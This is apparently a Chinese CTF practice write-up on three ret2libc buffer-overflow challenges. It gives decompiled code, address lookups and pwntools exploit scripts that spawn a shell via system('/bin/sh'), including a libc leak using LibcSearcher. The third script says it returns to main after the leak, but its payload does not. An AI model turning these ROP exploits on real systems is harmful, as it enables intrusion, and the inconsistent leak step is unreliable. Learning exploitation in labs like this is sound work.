# PWN Exercise - ret2libc

[toc]

## ret2libc1

### 题目

checksec
```
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```
伪代码：
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [sp+1Ch] [bp-64h]@1

  setvbuf(stdout, 0, 2, 0);
  setvbuf(_bss_start, 0, 1, 0);
  puts("RET2LIBC >_<");
  gets((char *)&v4);
  return 0;
}
```
### PWN
程序有system函数，有/bin/sh字符串。   

0x08048720 : /bin/sh
```
$ ROPgadget --binary ret2libc1 --string "/bin/sh"
Strings information
============================================================
0x08048720 : /bin/sh
```
0x08048460  system@plt
```
pwndbg> info function
All defined functions:

File ret2libc1.c:
19:	int main(void);
8:	void secure(void);

Non-debugging symbols:
0x080483fc  _init
0x08048430  gets@plt
0x08048440  time@plt
0x08048450  puts@plt
0x08048460  system@plt
0x08048470  __gmon_start__@plt
0x08048480  srand@plt
0x08048490  __libc_start_main@plt
0x080484a0  setvbuf@plt
0x080484b0  rand@plt
0x080484c0  __isoc99_scanf@plt
0x080484d0  _start
0x08048500  __x86.get_pc_thunk.bx
0x08048510  deregister_tm_clones
0x08048540  register_tm_clones
0x08048580  __do_global_dtors_aux
0x080485a0  frame_dummy
0x08048690  __libc_csu_init
0x08048700  __libc_csu_fini
0x08048704  _fini
```
EXP:
```python
from pwn import *

elf = ELF('ret2libc1')
io = process(elf.path)
#gdb.attach(io,"b * 0x08048689")
system_addr = 0x08048460
bin_sh_addr = 0x08048720
payload = b'a'*0x6c +b'bbbb' +p32(system_addr) + b'cccc' + p32(bin_sh_addr)
io.sendline(payload)
io.interactive()
```

## ret2libc2

本题上一次基本一致，就是搜索不到`/bin/sh`字符串。   
所以需要办法把字符串写到变量中调用，可以查看bss段，全局变量。   
ida可以通过快捷键g，跳转到.bss。   
题预设了一个buf2全局变量，可以利用。
```
.bss:0804A080                 public buf2
.bss:0804A080 ; char buf2[100]
.bss:0804A080 buf2            db 64h dup(?)
.bss:0804A080 _bss            ends
.bss:0804A080
```

### PWN

EXP:
```python
from pwn import *

elf = ELF('ret2libc2')
io = process(elf.path)
gets_addr = 0x08048460
system_addr = 0x08048490
buf2_addr = 0x0804A080
pop_ebx = 0x0804843d
#gdb.attach(io,"b * 0x080486bf")
#payload = flat(['a' * 112, gets_addr, pop_ebx, buf2_addr, system_addr, 'bbbb', buf2_addr])
payload = flat(['a' * 112, gets_addr, system_addr, buf2_addr, buf2_addr])
io.sendline(payload)
io.sendline('/bin/sh')
io.interactive()
```


## ret2libc3



伪代码：
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [sp+1Ch] [bp-64h]@1

  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 1, 0);
  puts("No surprise anymore, system disappeard QQ.");
  printf("Can you find it !?");
  gets((char *)&v4);
  return 0;
}
```
在ret2libc2的基础上，system()函数也被去除掉了。   
就需要利用libc中的system(),和`/bin/sh`。   
思路：   
1. 泄露地址，计算相对地址。   
由于 libc 的延迟绑定机制，我们需要泄漏已经执行过的函数的地址。
2. 计算system(),`/bin/sh`绝对地址
3. 执行system()

### 准备
https://github.com/lieanu/LibcSearcher
```python
from LibcSearcher import *

#第二个参数，为已泄露的实际地址,或最后12位(比如：d90)，int类型
obj = LibcSearcher("fgets", 0X7ff39014bd90)

obj.dump("system")        #system 偏移
obj.dump("str_bin_sh")    #/bin/sh 偏移
obj.dump("__libc_start_main_ret")    
```
### PWN

```python
from pwn import *
from LibcSearcher import LibcSearcher

elf = ELF('ret2libc3')
io = process(elf.path)

puts_addr = elf.plt['puts']
print('puts_plt addr:',hex(puts_addr))
libc_start_main_got_addr = elf.got['__libc_start_main']
print('__libc_start_main addr:',hex(libc_start_main_got_addr))
main_addr = elf.symbols['main']
print('main addr:',hex(main_addr))

print("1. leak libc_start_main_got addr and return to main again")

payload = flat([112*'a',puts_addr,'bbbb',libc_start_main_got_addr])
io.sendlineafter('Can you find it !?', payload)
libc_start_main_addr = u32(io.recv()[0:4])
print("libc_start_main addr:",hex(libc_start_main_addr))

print("2. get system and /bin/sh addr.")
libc = LibcSearcher('__libc_start_main', libc_start_main_addr)
libcbase = libc_start_main_addr - libc.dump('__libc_start_main')
system_addr = libcbase + libc.dump('system')
print('system addr:',system_addr)
binsh_addr = libcbase + libc.dump('str_bin_sh')
print('/bin/sh string addr:',binsh_addr)

print("3. get shell")

payload = flat(['a' * 104, system_addr, 'bbbb', binsh_addr])
io.sendline(payload)
io.interactive()
```